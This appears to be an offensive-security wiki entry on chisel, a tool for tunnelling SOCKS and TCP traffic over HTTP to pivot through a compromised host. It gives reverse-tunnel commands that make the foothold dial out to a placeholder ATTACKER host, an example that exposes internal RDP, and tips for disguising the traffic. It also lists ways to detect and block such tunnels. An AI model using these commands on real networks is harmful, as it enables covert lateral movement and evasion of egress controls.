---
title: chisel
slug: chisel
---

> **TL;DR:** Single-binary HTTP-tunnelled SOCKS5/TCP/UDP pivot. Reach for it when SSH is unavailable, when egress is restricted to web ports, or when you need a SOCKS proxy from a foothold that lacks one natively.

## What it is
chisel is a Go-based tunnel that multiplexes streams over an HTTP-upgraded WebSocket session, optionally wrapped in TLS. The same static binary runs as either client or server, so the operator picks the direction (forward or reverse) at runtime. The default mode of operation in offensive use is reverse: a server on the attacker box listens, the compromised host dials out, and the operator obtains a SOCKS5 endpoint or arbitrary port-forwards through the foothold.

## Preconditions / where it applies
- Outbound HTTP/HTTPS reachable from the foothold to attacker-controlled infrastructure (port 80/443 typically).
- Ability to drop and execute a static binary on the target (Linux, Windows, macOS, BSD — match GOOS/GOARCH).
- Egress filtering that allows web traffic but blocks raw TCP outbound — exactly the case where SSH `-D` is dead in the water.
- Related: [[port-forwarding]], [[ssh-tunneling]], [[ligolo-ng]].

## Technique
Attacker listener exposing port 8080 with a pre-shared auth token:

```bash
chisel server -p 8080 --reverse --auth user:pass
```

Foothold dials back and requests a reverse SOCKS5 proxy bound on the attacker host port 1080:

```bash
./chisel client --auth user:pass http://ATTACKER:8080 R:socks
```

Tools then chain through `proxychains4 -q nmap ...` or `curl --socks5 127.0.0.1:1080 ...`. For a specific TCP forward (e.g. expose internal RDP on attacker localhost 33389):

```bash
./chisel client --auth user:pass http://ATTACKER:8080 R:33389:10.10.20.5:3389
```

Wrap in TLS by serving with `--tls-key`/`--tls-cert` and connecting via `https://`. Add `--keepalive 25s` over flaky links. For OPSEC, set `--fingerprint` on the client to pin the server cert, and place a reverse-proxy in front of chisel to present a benign-looking vhost.

## Detection and defence
- Long-lived WebSocket Upgrade sessions to unusual external IPs — egress-proxy logs and Zeek `websocket.log` make these visible.
- TLS JA3/JA4 fingerprint for the Go HTTP stack is distinctive; EDRs increasingly flag it.
- Block by enforcing an authenticated egress web proxy with category/reputation filtering and TLS interception; deny direct TCP egress on 80/443 from server segments.
- Hunt for the static Go binary on disk (large unstripped ELF/PE with `chisel` strings) — application allow-listing kills the drop.

## References
- [chisel on GitHub](https://github.com/jpillora/chisel) — upstream README with flag reference and reverse/forward modes.
- [HackTricks — tunneling and port forwarding](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/tunneling-and-port-forwarding.html) — chisel patterns alongside other pivot tools.
